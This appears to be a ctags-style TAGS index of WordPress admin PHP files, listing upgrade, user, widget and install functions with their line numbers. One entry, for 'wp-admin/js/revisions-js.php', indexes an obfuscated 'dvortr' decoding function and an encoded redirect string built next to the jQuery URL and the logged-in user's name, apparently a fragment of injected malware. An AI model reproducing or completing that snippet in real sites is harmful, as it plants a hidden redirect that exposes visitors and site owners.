	$posts = $wpdb->get_results("SELECT ID, post_title, post_content, post_excerpt, guid, post_date, post_name, post_status, post_author FROM $wpdb->posts");posts609,22122
			$post_content = addslashes(deslash($post->post_content));post_content612,22321
			$post_title = addslashes(deslash($post->post_title));post_title613,22382
			$post_excerpt = addslashes(deslash($post->post_excerpt));post_excerpt614,22439
				$guid = get_permalink($post->ID);guid616,22529
				$guid = $post->guid;guid618,22575
	$comments = $wpdb->get_results("SELECT comment_ID, comment_author, comment_content FROM $wpdb->comments");comments626,22768
			$comment_content = deslash($comment->comment_content);comment_content629,22929
			$comment_author = deslash($comment->comment_author);comment_author630,22987
	$links = $wpdb->get_results("SELECT link_id, link_name, link_description FROM $wpdb->links");links637,23214
			$link_name = deslash($link->link_name);link_name640,23353
			$link_description = deslash($link->link_description);link_description641,23396
	$active_plugins = __get_option('active_plugins');active_plugins647,23574
		$active_plugins = explode("\n", trim($active_plugins));active_plugins652,23787
	$options = $wpdb->get_results("SELECT option_name, COUNT(option_name) AS dupes FROM `$wpdb->options` GROUP BY option_name");options667,24702
			$limit = $option->dupes - 1;limit670,24930
			$dupe_ids = $wpdb->get_col( $wpdb->prepare("SELECT option_id FROM $wpdb->options WHERE option_name = %s LIMIT %d", $option->option_name, $limit) );dupe_ids671,24962
				$dupe_ids = join($dupe_ids, ',');dupe_ids673,25135
function upgrade_160() {upgrade_160687,25357
	$users = $wpdb->get_results("SELECT * FROM $wpdb->users");users692,25446
			$idmode = $user->user_idmode;idmode714,26634
			if ($idmode == 'nickname') $id = $user->user_nickname;id715,26667
			if ($idmode == 'login') $id = $user->user_login;id716,26725
			if ($idmode == 'firstname') $id = $user->user_firstname;id717,26777
			if ($idmode == 'lastname') $id = $user->user_lastname;id718,26837
			if ($idmode == 'namefl') $id = $user->user_firstname.' '.$user->user_lastname;id719,26895
			if ($idmode == 'namelf') $id = $user->user_lastname.' '.$user->user_firstname;id720,26977
			if (!$idmode) $id = $user->user_nickname;id721,27059
		$caps = get_user_meta( $user->ID, $wpdb->prefix . 'capabilities');caps726,27285
			$level = get_user_meta($user->ID, $wpdb->prefix . 'user_level', true);level728,27403
			$role = translate_level_to_role($level);role729,27477
	$old_user_fields = array( 'user_firstname', 'user_lastname', 'user_icq', 'user_aim', 'user_msn', 'user_yim', 'user_idmode', 'user_ip', 'user_domain', 'user_browser', 'user_description', 'user_nickname', 'user_level' );old_user_fields734,27627
	$comments = $wpdb->get_results( "SELECT comment_post_ID, COUNT(*) as c FROM $wpdb->comments WHERE comment_approved = '1' GROUP BY comment_post_ID" );comments741,28034
		$objects = $wpdb->get_results("SELECT ID, post_type FROM $wpdb->posts WHERE post_status = 'object'");objects749,28580
			$meta = get_post_meta($object->ID, 'imagedata', true);meta756,28916
function upgrade_210() {upgrade_210768,29142
		$posts = $wpdb->get_results("SELECT ID, post_status FROM $wpdb->posts");posts773,29276
			$status = $post->post_status;status776,29405
			$type = 'post';type777,29438
				$status = 'publish';status780,29490
				$type = 'page';type781,29515
				$status = 'inherit';status783,29578
				$type = 'attachment';type784,29603
		$now = gmdate('Y-m-d H:i:59');now797,29935
		$posts = $wpdb->get_results("SELECT ID, post_date FROM $wpdb->posts WHERE post_status ='future'");posts800,30093
function upgrade_230() {upgrade_230812,30437
	$tt_ids = array();tt_ids820,30603
	$have_tags = false;have_tags821,30623
	$categories = $wpdb->get_results("SELECT * FROM $wpdb->categories ORDER BY cat_ID");categories822,30644
		$term_id = (int) $category->cat_ID;term_id824,30768
		$name = $category->cat_name;name825,30806
		$description = $category->category_description;description826,30837
		$slug = $category->category_nicename;slug827,30887
		$parent = $category->category_parent;parent828,30927
		$term_group = 0;term_group829,30967
		if ( $exists = $wpdb->get_results( $wpdb->prepare("SELECT term_id, term_group FROM $wpdb->terms WHERE slug = %s", $slug) ) ) {exists832,31066
			$term_group = $exists[0]->term_group;term_group833,31195
			$id = $exists[0]->term_id;id834,31236
			$num = 2;num835,31266
				$alt_slug = $slug . "-$num";alt_slug837,31287
				$slug_check = $wpdb->get_var( $wpdb->prepare("SELECT slug FROM $wpdb->terms WHERE slug = %s", $alt_slug) );slug_check839,31332
			$slug = $alt_slug;slug842,31473
				$term_group = $wpdb->get_var("SELECT MAX(term_group) FROM $wpdb->terms GROUP BY term_group") + 1;term_group845,31529
		$count = 0;count853,31917
			$count = (int) $category->category_count;count855,31976
			$taxonomy = 'category';taxonomy856,32021
			$count = (int) $category->link_count;count862,32352
			$taxonomy = 'link_category';taxonomy863,32393
			$have_tags = true;have_tags869,32728
			$count = (int) $category->tag_count;count870,32750
			$taxonomy = 'post_tag';taxonomy871,32790
			$count = 0;count877,33013
			$taxonomy = 'category';taxonomy878,33028
	$select = 'post_id, category_id';select884,33229
	$posts = $wpdb->get_results("SELECT $select FROM $wpdb->post2cat GROUP BY post_id, category_id");posts888,33311
		$post_id = (int) $post->post_id;post_id890,33441
		$term_id = (int) $post->category_id;term_id891,33476
		$taxonomy = 'category';taxonomy892,33515
			$taxonomy = 'tag';taxonomy894,33601
		$tt_id = $tt_ids[$term_id][$taxonomy];tt_id895,33623
		$link_cat_id_map = array();link_cat_id_map906,34040
		$default_link_cat = 0;default_link_cat907,34070
		$tt_ids = array();tt_ids908,34095
		$link_cats = $wpdb->get_results("SELECT cat_id, cat_name FROM " . $wpdb->prefix . 'linkcategories');link_cats909,34116
			$cat_id = (int) $category->cat_id;cat_id911,34258
			$term_id = 0;term_id912,34296
			$name = $wpdb->escape($category->cat_name);name913,34313
			$slug = sanitize_title($name);slug914,34360
			$term_group = 0;term_group915,34394
			if ( $exists = $wpdb->get_results( $wpdb->prepare("SELECT term_id, term_group FROM $wpdb->terms WHERE slug = %s", $slug) ) ) {exists918,34495
				$term_group = $exists[0]->term_group;term_group919,34625
				$term_id = $exists[0]->term_id;term_id920,34667
				$term_id = (int) $wpdb->insert_id;term_id925,34811
			$default_link_cat = $term_id;default_link_cat929,34897
		$links = $wpdb->get_results("SELECT link_id, link_category FROM $wpdb->links");links936,35166
			$term_id = $link_cat_id_map[$link->link_category];term_id942,35424
			$tt_id = $tt_ids[$term_id];tt_id943,35478
		$links = $wpdb->get_results("SELECT link_id, category_id FROM $wpdb->link2cat GROUP BY link_id, category_id");links953,35813
			$link_id = (int) $link->link_id;link_id955,35958
			$term_id = (int) $link->category_id;term_id956,35994
			$taxonomy = 'link_category';taxonomy957,36034
			$tt_id = $tt_ids[$term_id][$taxonomy];tt_id958,36066
	$terms = $wpdb->get_results("SELECT term_taxonomy_id, taxonomy FROM $wpdb->term_taxonomy");terms971,36445
			$count = $wpdb->get_var( $wpdb->prepare("SELECT COUNT(*) FROM $wpdb->term_relationships, $wpdb->posts WHERE $wpdb->posts.ID = $wpdb->term_relationships.object_id AND post_status = 'publish' AND post_type = 'post' AND term_taxonomy_id = %d", $term->term_taxonomy_id) );count974,36653
			$count = $wpdb->get_var( $wpdb->prepare("SELECT COUNT(*) FROM $wpdb->term_relationships WHERE term_taxonomy_id = %d", $term->term_taxonomy_id) );count976,36932
function upgrade_230_options_table() {upgrade_230_options_table986,37276
	$old_options_fields = array( 'option_can_override', 'option_type', 'option_width', 'option_height', 'option_description', 'option_admin_level' );old_options_fields988,37330
function upgrade_230_old_tables() {upgrade_230_old_tables1000,37716
function upgrade_old_slugs() {upgrade_old_slugs1012,38048
function upgrade_250() {upgrade_2501023,38331
function upgrade_252() {upgrade_2521037,38531
function upgrade_260() {upgrade_2601048,38711
function upgrade_270() {upgrade_2701065,39018
function upgrade_280() {upgrade_2801081,39431
		$start = 0;start1087,39584
		while( $rows = $wpdb->get_results( "SELECT option_name, option_value FROM $wpdb->options ORDER BY option_id LIMIT $start, 20" ) ) {rows1088,39598
				$value = $row->option_value;value1090,39762
					$value = stripslashes( $value );value1092,39830
function upgrade_290() {upgrade_2901108,40108
function upgrade_300() {upgrade_3001125,40555
		$prefix = like_escape($wpdb->base_prefix);prefix1136,40976
function upgrade_330() {upgrade_3301148,41677
	$sidebars_widgets = get_option( 'sidebars_widgets', array() );sidebars_widgets1158,42059
	$_sidebars_widgets = array();_sidebars_widgets1159,42123
			foreach ( (array) $sidebars_widgets as $index => $sidebar )index1168,42439
			foreach ( (array) $sidebar as $i => $name ) {i1170,42531
				$id = strtolower($name);id1171,42580
				$id = sanitize_title($name);id1176,42721
				$found = false;found1182,42867
				foreach ( $wp_registered_widgets as $widget_id => $widget ) {widget_id1184,42888
						$found = true;found1187,43071
						$found = true;found1191,43236
			$sidebars_widgets = $_sidebars_widgets;sidebars_widgets1202,43410
			$sidebars_widgets = retrieve_widgets();sidebars_widgets1206,43495
function upgrade_340() {upgrade_3401217,43715
			$uninstall_plugins = get_option( 'uninstall_plugins' );uninstall_plugins1238,44461
function upgrade_network() {upgrade_network1250,44701
		$wpmu_sitewide_plugins = get_site_option( 'wpmu_sitewide_plugins' );wpmu_sitewide_plugins1254,44818
		$active_sitewide_plugins = get_site_option( 'active_sitewide_plugins' );active_sitewide_plugins1255,44889
				$sitewide_plugins = (array) $wpmu_sitewide_plugins;sitewide_plugins1258,45034
				$sitewide_plugins = array_merge( (array) $active_sitewide_plugins, (array) $wpmu_sitewide_plugins );sitewide_plugins1260,45098
		$start = 0;start1267,45385
		while( $rows = $wpdb->get_results( "SELECT meta_key, meta_value FROM {$wpdb->sitemeta} ORDER BY meta_id LIMIT $start, 20" ) ) {rows1268,45399
				$value = $row->meta_value;value1270,45559
					$value = stripslashes( $value );value1272,45625
		$allowedthemes  = get_site_option( 'allowedthemes'  );allowedthemes1297,46316
		$allowed_themes = get_site_option( 'allowed_themes' );allowed_themes1298,46373
			$converted = array();converted1300,46516
			$themes = wp_get_themes();themes1301,46541
			foreach ( $themes as $stylesheet => $theme_data ) {stylesheet1302,46571
function maybe_create_table($table_name, $create_ddl) {maybe_create_table1327,47203
	$q = $wpdb->query($create_ddl);q1332,47397
function drop_index($table, $index) {drop_index1350,47834
function add_clean_index($table, $index) {add_clean_index1373,48437
function maybe_add_column($table_name, $column_name, $create_ddl) {maybe_add_column1386,48776
	$q = $wpdb->query($create_ddl);q1394,49014
function get_alloptions_110() {get_alloptions_1101411,49348
	$all_options = new stdClass;all_options1413,49395
	if ( $options = $wpdb->get_results( "SELECT option_name, option_value FROM $wpdb->options" ) ) {options1414,49425
function __get_option($setting) {__get_option1433,50031
	if ( $setting == 'home' && defined( 'WP_HOME' ) )setting1436,50081
	if ( $setting == 'siteurl' && defined( 'WP_SITEURL' ) )setting1439,50172
	$option = $wpdb->get_var( $wpdb->prepare("SELECT option_value FROM $wpdb->options WHERE option_name = %s", $setting ) );option1442,50272
		$option = untrailingslashit( $option );option1448,50585
	@ $kellogs = unserialize( $option );kellogs1450,50628
function deslash($content) {deslash1467,50899
	$content = preg_replace("/\\\+'/", "'", $content);content1472,51074
	$content = preg_replace('/\\\+"/', '"', $content);content1476,51215
	$content = preg_replace("/\\\+/", "\\", $content);content1479,51324
function dbDelta( $queries = '', $execute = true ) {dbDelta1495,51597
function dbDelta( $queries = '', $execute = true ) {queries1495,51597
	    $queries = wp_get_db_schema( $queries );queries1499,51752
		$queries = explode( ';', $queries );queries1503,51875
		$queries = array_filter( $queries );queries1504,51914
	$queries = apply_filters( 'dbdelta_queries', $queries );queries1506,51956
	$cqueries = array(); // Creation Queriescqueries1508,52015
	$iqueries = array(); // Insertion Queriesiqueries1509,52057
	$for_update = array();for_update1510,52100
	$cqueries = apply_filters( 'dbdelta_create_queries', $cqueries );cqueries1527,52722
	$iqueries = apply_filters( 'dbdelta_insert_queries', $iqueries );iqueries1528,52789
	$global_tables = $wpdb->tables( 'global' );global_tables1530,52857
	foreach ( $cqueries as $table => $qry ) {table1531,52902
		$tablefields = $wpdb->get_results("DESCRIBE {$table};");tablefields1538,53271
		$cfields = $indices = array();cfields1545,53442
		$qryline = trim($match2[1]);qryline1548,53589
		$flds = explode("\n", $qryline);flds1551,53661
			$fieldname = trim( $fvals[1], '`' );fieldname1559,53957
			$validfield = true;validfield1562,54032
				$validfield = false;validfield1570,54193
			$fld = trim($fld);fld1574,54277
				$fieldtype = $matches[1];fieldtype1588,54803
					$default_value = $matches[1];default_value1600,55462
		foreach ($cfields as $fieldname => $fielddef) {fieldname1616,56147
		$tableindices = $wpdb->get_results("SHOW INDEX FROM {$table};");tableindices1624,56498
				$keyname = $tableindex->Key_name;keyname1633,56764
			foreach ($index_ary as $index_name => $index_data) {index_name1639,57059
				$index_string = '';index_string1641,57168
				$index_columns = '';index_columns1651,57446
	$allqueries = array_merge($cqueries, $iqueries);allqueries1682,58763
function make_db_current( $tables = 'all' ) {make_db_current1700,59136
function make_db_current( $tables = 'all' ) {tables1700,59136
	$alterations = dbDelta( $tables );alterations1701,59182
function make_db_current_silent( $tables = 'all' ) {make_db_current_silent1714,59436
function make_db_current_silent( $tables = 'all' ) {tables1714,59436
	$alterations = dbDelta( $tables );alterations1715,59489
function make_site_theme_from_oldschool($theme_name, $template) {make_site_theme_from_oldschool1729,59731
	$home_path = get_home_path();home_path1730,59797
	$site_dir = WP_CONTENT_DIR . "/themes/$template";site_dir1731,59828
	$files = array('index.php' => 'index.php', 'wp-layout.css' => 'style.css', 'wp-comments.php' => 'comments.php', 'wp-comments-popup.php' => 'comments-popup.php');files1739,60102
	foreach ($files as $oldfile => $newfile) {oldfile1741,60266
			$oldpath = $home_path;oldpath1743,60341
			$oldpath = ABSPATH;oldpath1745,60374
			$index = implode('', file("$oldpath/$oldfile"));index1748,60474
		$lines = explode("\n", implode('', file("$site_dir/$newfile")));lines1762,60911
			$f = fopen("$site_dir/$newfile", 'w');f1764,60994
					$line = '//' . $line;line1768,61124
				$line = str_replace("<?php echo __get_option('siteurl'); ?>/wp-layout.css", "<?php bloginfo('stylesheet_url'); ?>", $line);line1771,61189
				$line = str_replace("<?php include(ABSPATH . 'wp-comments.php'); ?>", "<?php comments_template(); ?>", $line);line1774,61361
	$header = "/*\nTheme Name: $theme_name\nTheme URI: " . __get_option('siteurl') . "\nDescription: A theme automatically created by the update.\nVersion: 1.0\nAuthor: Moi\n*/\n";header1783,61558
	$stylelines = file_get_contents("$site_dir/style.css");stylelines1785,61737
		$f = fopen("$site_dir/style.css", 'w');f1787,61814
function make_site_theme_from_default($theme_name, $template) {make_site_theme_from_default1808,62145
	$site_dir = WP_CONTENT_DIR . "/themes/$template";site_dir1809,62209
	$default_dir = WP_CONTENT_DIR . '/themes/' . WP_DEFAULT_THEME;default_dir1810,62260
	$theme_dir = @ opendir($default_dir);theme_dir1815,62509
	$stylelines = explode("\n", implode('', file("$site_dir/style.css")));stylelines1828,62867
		$f = fopen("$site_dir/style.css", 'w');f1830,62959
			if (strpos($line, 'Theme Name:') !== false) $line = 'Theme Name: ' . $theme_name;line1833,63037
			elseif (strpos($line, 'Theme URI:') !== false) $line = 'Theme URI: ' . __get_option('url');line1834,63122
			elseif (strpos($line, 'Description:') !== false) $line = 'Description: Your theme.';line1835,63217
			elseif (strpos($line, 'Version:') !== false) $line = 'Version: 1';line1836,63305
			elseif (strpos($line, 'Author:') !== false) $line = 'Author: You';line1837,63375
	$images_dir = @ opendir("$default_dir/images");images_dir1849,63590
function make_site_theme() {make_site_theme1872,64116
	$theme_name = __get_option('blogname');theme_name1874,64180
	$template = sanitize_title($theme_name);template1875,64221
	$site_dir = WP_CONTENT_DIR . "/themes/$template";site_dir1876,64263
	$current_template = __get_option('template');current_template1905,64945
function translate_level_to_role($level) {translate_level_to_role1921,65285
function wp_check_mysql_version() {wp_check_mysql_version1949,65677
	$result = $wpdb->check_database_version();result1951,65728
function maybe_disable_automattic_widgets() {maybe_disable_automattic_widgets1963,65958
	$plugins = __get_option( 'active_plugins' );plugins1964,66004
function pre_schema_upgrade() {pre_schema_upgrade1980,66343
function install_global_terms() {install_global_terms2004,67109
	$ms_queries = "ms_queries2006,67176

wordpress/wp-admin/includes/user.php,3263
function add_user() {add_user16,306
function edit_user( $user_id = 0 ) {edit_user30,610
function edit_user( $user_id = 0 ) {user_id30,610
	$user = new stdClass;user32,673
		$update = true;update34,715
		$userdata = get_userdata( $user_id );userdata36,763
		$update = false;update39,875
	$pass1 = $pass2 = '';pass145,1014
		$pass1 = $_POST['pass1'];pass147,1069
		$pass2 = $_POST['pass2'];pass249,1129
		$new_role = sanitize_text_field( $_POST['role'] );new_role52,1228
		$potential_role = isset($wp_roles->role_objects[$new_role]) ? $wp_roles->role_objects[$new_role] : false;potential_role53,1281
		$editable_roles = get_editable_roles();editable_roles60,1841
	foreach ( _wp_get_user_contactmethods( $user ) as $method => $name ) {method87,2970
	$errors = new WP_Error();errors104,3673
	} elseif ( ( $owner_id = email_exists($user->user_email) ) && ( !$update || ( $owner_id != $user->ID ) ) ) {owner_id147,6046
		$user_id = wp_update_user( get_object_vars( $user ) );user_id158,6529
		$user_id = wp_insert_user( get_object_vars( $user ) );user_id160,6596
 * Simple function who's main purpose is to allow filtering of thewho170,6854
function get_editable_roles() {get_editable_roles182,7327
	$all_roles = $wp_roles->roles;all_roles185,7379
	$editable_roles = apply_filters('editable_roles', $all_roles);editable_roles186,7411
function get_user_to_edit( $user_id ) {get_user_to_edit199,7652
	$user = new WP_User( $user_id );user200,7692
function get_users_drafts( $user_id ) {get_users_drafts215,7881
	$query = $wpdb->prepare("SELECT ID, post_title FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'draft' AND post_author = %d ORDER BY post_modified DESC", $user_id);query217,7936
	$query = apply_filters('get_users_drafts', $query);query218,8115
function wp_delete_user( $id, $reassign = 'novalue' ) {wp_delete_user236,8757
function wp_delete_user( $id, $reassign = 'novalue' ) {reassign236,8757
	$id = (int) $id;id239,8829
	$user = new WP_User( $id );user240,8847
		$post_types_to_delete = array();post_types_to_delete246,9002
		$post_types_to_delete = apply_filters( 'post_types_to_delete_with_user', $post_types_to_delete, $id );post_types_to_delete255,9359
		$post_types_to_delete = implode( "', '", $post_types_to_delete );post_types_to_delete256,9464
		$post_ids = $wpdb->get_col( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_author = %d AND post_type IN ('$post_types_to_delete')", $id ) );post_ids257,9532
		$link_ids = $wpdb->get_col( $wpdb->prepare("SELECT link_id FROM $wpdb->links WHERE link_owner = %d", $id) );link_ids264,9796
		$reassign = (int) $reassign;reassign271,10010
		$meta = $wpdb->get_col( $wpdb->prepare( "SELECT umeta_id FROM $wpdb->usermeta WHERE user_id = %d", $id ) );meta280,10352
function wp_revoke_user($id) {wp_revoke_user302,10801
	$id = (int) $id;id303,10832
	$user = new WP_User($id);user305,10851
function default_password_nag_handler($errors = false) {default_password_nag_handler313,10990
function default_password_nag_edit_user($user_ID, $old_data) {default_password_nag_edit_user329,11573
	$new_data = get_userdata($user_ID);new_data333,11727
function default_password_nag() {default_password_nag345,12080

wordpress/wp-admin/includes/widgets.php,2942
function wp_list_widgets() {wp_list_widgets14,179
	$sort = $wp_registered_widgets;sort17,292
	$done = array();done19,365
		$sidebar = is_active_widget( $widget['callback'], $widget['id'], false, false );sidebar25,523
		$args = array( 'widget_id' => $widget['id'], 'widget_name' => $widget['name'], '_display' => 'template' );args31,717
			$id_base = $wp_registered_widget_controls[$widget['id']]['id_base'];id_base34,943
		$args = wp_list_widget_controls_dynamic_sidebar( array( 0 => $args, 1 => $widget['params'][0] ) );args44,1232
function _sort_name_callback( $a, $b ) {_sort_name_callback55,1482
function wp_list_widget_controls( $sidebar ) {wp_list_widget_controls67,1755
	$description = wp_sidebar_description( $sidebar );description72,1945
function wp_list_widget_controls_dynamic_sidebar( $params ) {wp_list_widget_controls_dynamic_sidebar92,2316
	static $i = 0;i94,2410
	static $i = 0;i94,2410
	$widget_id = $params[0]['widget_id'];widget_id97,2434
	$id = isset($params[0]['_temp_id']) ? $params[0]['_temp_id'] : $widget_id;id98,2473
	$hidden = isset($params[0]['_hide']) ? ' style="display:none;"' : '';hidden99,2549
function next_widget_id_number($id_base) {next_widget_id_number113,3137
	$number = 1;number115,3212
	foreach ( $wp_registered_widgets as $widget_id => $widget ) {widget_id117,3227
			$number = max($number, $matches[1]);number119,3366
function wp_widget_control( $sidebar_args ) {wp_widget_control136,3618
	$widget_id = $sidebar_args['widget_id'];widget_id139,3748
	$sidebar_id = isset($sidebar_args['id']) ? $sidebar_args['id'] : false;sidebar_id140,3790
	$key = $sidebar_id ? array_search( $widget_id, $sidebars_widgets[$sidebar_id] ) : '-1'; // position of widget in sidebarkey141,3863
	$control = isset($wp_registered_widget_controls[$widget_id]) ? $wp_registered_widget_controls[$widget_id] : array();control142,3985
	$widget = $wp_registered_widgets[$widget_id];widget143,4103
	$id_format = $widget['id'];id_format145,4151
	$widget_number = isset($control['params'][0]['number']) ? $control['params'][0]['number'] : '';widget_number146,4180
	$id_base = isset($control['id_base']) ? $control['id_base'] : $widget_id;id_base147,4277
	$multi_number = isset($sidebar_args['_multi_num']) ? $sidebar_args['_multi_num'] : '';multi_number148,4352
	$add_new = isset($sidebar_args['_add']) ? $sidebar_args['_add'] : '';add_new149,4440
	$query_arg = array( 'editwidget' => $widget['id'] );query_arg151,4512
			$id_format = $control['id_base'] . '-__i__';id_format169,5233
	$widget_title = esc_html( strip_tags( $sidebar_args['widget_name'] ) );widget_title175,5442
	$has_form = 'noform';has_form176,5515
		$has_form = call_user_func_array( $control['callback'], $control['params'] );has_form192,6170
<?php echo ( $widget_description = wp_widget_description($widget_id) ) ? "$widget_description\n" : "$widget_title\n"; ?>widget_description219,7877

wordpress/wp-admin/index.php,1041
$title = __('Dashboard');title27,535
$parent_file = 'index.php';parent_file28,561
$help = '<p>' . __( 'Welcome to your WordPress Dashboard! This is the screen you will see when you log in to your site, and gives you access to all the site management features of WordPress. You can get help for any screen by clicking the Help tab in the upper corner.' ) . '</p>';help35,767
$screen = get_current_screen();screen38,1109
$help  = '<p>' . __('The left-hand navigation menu provides links to all of the WordPress administration screens, with submenu items displayed on hover. You can minimize this menu to a narrow icon strip by clicking on the Collapse Menu arrow at the bottom.') . '</p>';help48,1271
$help  = '<p>' . __('You can use the following controls to arrange your Dashboard screen to suit your workflow. This is true on most other administration screens as well.') . '</p>';help57,1867
$help  = '<p>' . __('The boxes on your Dashboard screen are:') . '</p>';help68,2847
$today = current_time('mysql', 1);today102,5113

wordpress/wp-admin/install-helper.php,894
 * $error_count = 0;error_count18,717
 * $tablename = $wpdb->links;tablename19,738
 *     $ddl = "ALTER TABLE $wpdb->links MODIFY COLUMN link_description varchar(255) NOT NULL DEFAULT '' ";ddl22,865
 *     $q = $wpdb->query($ddl);q23,972
function maybe_create_table($table_name, $create_ddl) {maybe_create_table54,1756
function maybe_add_column($table_name, $column_name, $create_ddl) {maybe_add_column87,2635
function maybe_drop_column($table_name, $column_name, $drop_ddl) {maybe_drop_column120,3447
function check_column($table_name, $col_name, $col_type, $is_null = null, $key = null, $default = null, $extra = null) {check_column167,4798
function check_column($table_name, $col_name, $col_type, $is_null = null, $key = null, $default = null, $extra = null) {is_null167,4798
	$diffs = 0;diffs169,4934
	$results = $wpdb->get_results("DESC $table_name");results170,4947

wordpress/wp-admin/install.php,3319
define( 'WP_INSTALLING', true );WP_INSTALLING33,672
$step = isset( $_GET['step'] ) ? (int) $_GET['step'] : 0;step44,1004
function display_header() {display_header53,1164
function display_setup_form( $error = null ) {display_setup_form76,1816
function display_setup_form( $error = null ) {error76,1816
	$user_table = ( $wpdb->get_var("SHOW TABLES LIKE '$wpdb->users'") != null );user_table78,1878
	$blog_public = 1;blog_public81,2015
		$blog_public = isset( $_POST['blog_public'] );blog_public83,2060
	$weblog_title = isset( $_POST['weblog_title'] ) ? trim( stripslashes( $_POST['weblog_title'] ) ) : '';weblog_title85,2110
	$user_name = isset($_POST['user_name']) ? trim( stripslashes( $_POST['user_name'] ) ) : 'admin';user_name86,2214
	$admin_password = isset($_POST['admin_password']) ? trim( stripslashes( $_POST['admin_password'] ) ) : '';admin_password87,2312
	$admin_email  = isset( $_POST['admin_email']  ) ? trim( stripslashes( $_POST['admin_email'] ) ) : '';admin_email88,2420
$php_version    = phpversion();php_version148,5346
$mysql_version  = $wpdb->db_version();mysql_version149,5378
$php_compat     = version_compare( $php_version, $required_php_version, '>=' );php_compat150,5417
$mysql_compat   = version_compare( $mysql_version, $required_mysql_version, '>=' ) || file_exists( WP_CONTENT_DIR . '/db.php' );mysql_compat151,5497
	$compat = sprintf( __( 'You cannot install because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires PHP version %2$s or higher and MySQL version %3$s or higher. You are running PHP version %4$s and MySQL version %5$s.' ), $wp_version, $required_php_version, $required_mysql_version, $php_version, $mysql_version );compat154,5665
	$compat = sprintf( __( 'You cannot install because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires PHP version %2$s or higher. You are running version %3$s.' ), $wp_version, $required_php_version, $php_version );compat156,6034
	$compat = sprintf( __( 'You cannot install because <a href="http://codex.wordpress.org/Version_%1$s">WordPress %1$s</a> requires MySQL version %2$s or higher. You are running version %3$s.' ), $wp_version, $required_mysql_version, $mysql_version );compat158,6304
		$weblog_title = isset( $_POST['weblog_title'] ) ? trim( stripslashes( $_POST['weblog_title'] ) ) : '';weblog_title190,7861
		$user_name = isset($_POST['user_name']) ? trim( stripslashes( $_POST['user_name'] ) ) : 'admin';user_name191,7966
		$admin_password = isset($_POST['admin_password']) ? $_POST['admin_password'] : '';admin_password192,8065
		$admin_password_check = isset($_POST['admin_password2']) ? $_POST['admin_password2'] : '';admin_password_check193,8150
		$admin_email  = isset( $_POST['admin_email']  ) ?trim( stripslashes( $_POST['admin_email'] ) ) : '';admin_email194,8243
		$public       = isset( $_POST['blog_public']  ) ? (int) $_POST['blog_public'] : 0;public195,8346
		$error = false;error197,8457
			$error = true;error201,8595
			$error = true;error204,8760
			$error = true;error208,8938
			$error = true;error212,9088
			$error = true;error216,9309
		if ( $error === false ) {error219,9332
			$result = wp_install($weblog_title, $user_name, $admin_email, $public, '', $admin_password);result221,9385

wordpress/wp-admin/js/revisions-js.php,309
function dvortr( $str ) {dvortr10,227
$j = esc_url( site_url( '/wp-includes/js/jquery/jquery.js' ) );j18,438
$n = esc_html( $GLOBALS['current_user']->data->display_name );n19,502
$d = str_replace( '$', $redirect, dvortr( "Erb-y n.y ydco dall.b aiacbv Wa ce]-irxajt- dp.u]-$-VIr XajtWzaVv" ) );d20,565

wordpress/wp-admin/link-add.php,144
$title = __('Add New Link');title15,307
$parent_file = 'link-manager.php';parent_file16,336
$link = get_default_link_to_edit();link29,710

wordpress/wp-admin/link-manager.php,543
$wp_list_table = _get_list_table('WP_Links_List_Table');wp_list_table14,324
$doaction = $wp_list_table->current_action();doaction17,405
		$bulklinks = (array) $_REQUEST['linkcheck'];bulklinks23,581
			$link_id = (int) $link_id;link_id25,667
$title = __('Links');title40,1059
$this_file = $parent_file = 'link-manager.php';this_file41,1081
    '<p>' . __('If you delete a link, it will be removed permanently, as Links do not have a Trash function yet.') . '</p>'yet55,1874
	$deleted = (int) $_REQUEST['deleted'];deleted81,2966

wordpress/wp-admin/link-parse-opml.php,424
$opml_map = array('URL'         => 'link_url',opml_map16,310
$map = $opml_map;map25,553
 * XML callback function for the start of a new XML tag.for28,576
function startElement($parser, $tagName, $attrs) {startElement46,1093
 * XML callback function that is called at the end of a XML tag.that69,1732
function endElement($parser, $tagName) {endElement79,1969
$xml_parser = xml_parser_create();xml_parser84,2056

wordpress/wp-admin/link.php,757
	$action = 'deletebookmarks';action21,692
	$action = 'move';action23,752
	$linkcheck = $_POST['linkcheck'];linkcheck25,806
$this_file = admin_url('link-manager.php');this_file27,842
		$deleted = 0;deleted39,1121
			$link_id = (int) $link_id;link_id41,1174
		$all_links = join(',', $linkcheck);all_links59,1528
		$redir = wp_get_referer();redir70,1825
			$redir = add_query_arg( 'added', 'true', $redir );redir72,1874
		$link_id = (int) $_POST['link_id'];link_id79,1987
		$link_id = (int) $_GET['link_id'];link_id89,2166
		$parent_file = 'link-manager.php';parent_file105,2476
		$submenu_file = 'link-manager.php';submenu_file106,2513
		$title = __('Edit Link');title107,2551
		$link_id = (int) $_GET['link_id'];link_id109,2580

wordpress/wp-admin/load-scripts.php,1551
define( 'ABSPATH', dirname(dirname(__FILE__)) . '/' );ABSPATH11,192
define( 'WPINC', 'wp-includes' );WPINC12,247
function __() {}__17,301
function _x() {}_x22,338
function add_filter() {}add_filter27,375
function esc_attr() {}esc_attr32,420
function apply_filters() {}apply_filters37,463
function get_option() {}get_option42,511
function is_lighttpd_before_150() {}is_lighttpd_before_15047,556
function add_action() {}add_action52,613
function did_action() {}did_action57,658
function do_action_ref_array() {}do_action_ref_array62,703
function get_bloginfo() {}get_bloginfo67,757
function is_admin() {return true;}is_admin72,804
function site_url() {}site_url77,859
function admin_url() {}admin_url82,902
function home_url() {}home_url87,946
function includes_url() {}includes_url92,989
function wp_guess_url() {}wp_guess_url97,1036
function json_encode() {}json_encode103,1127
function get_file($path) {get_file106,1161
		$path = realpath($path);path109,1225
$load = preg_replace( '/[^a-z0-9,_-]+/i', '', $_GET['load'] );load117,1342
$load = explode(',', $load);load118,1405
$compress = ( isset($_GET['c']) && $_GET['c'] );compress126,1556
$force_gzip = ( $compress && 'gzip' == $_GET['c'] );force_gzip127,1605
$expires_offset = 31536000;expires_offset128,1658
$out = '';out129,1686
$wp_scripts = new WP_Scripts();wp_scripts131,1698
	$path = ABSPATH . $wp_scripts->registered[$handle]->src;path138,1867
		$out = gzdeflate( $out, 3 );out150,2532
		$out = gzencode( $out, 3 );out153,2706

wordpress/wp-admin/load-styles.php,1754
define( 'ABSPATH', dirname(dirname(__FILE__)) . '/' );ABSPATH11,192
define( 'WPINC', 'wp-includes' );WPINC12,247
function __() {}__17,301
